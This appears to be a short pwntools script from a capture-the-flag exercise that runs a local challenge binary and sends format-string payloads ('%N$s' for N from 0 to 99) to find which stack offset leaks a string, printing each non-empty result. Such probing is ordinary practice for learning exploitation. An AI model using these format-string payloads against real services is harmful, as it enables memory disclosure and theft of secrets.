from pwn import *
import os

os.chdir("/pwn/")

# Set the logging level to ERROR
context.log_level = "ERROR"

for i in range(100):
    try:
        p = process("./chall")
        payload = f"%{i}$s"
        p.sendline(payload.encode())
        output = p.recvall().decode().split('\n')
        if len(output[1]) > 0 :
            print(f"PAYLOAD = {payload}\nOUTPUT = {output[1]}\n")
    except:
        pass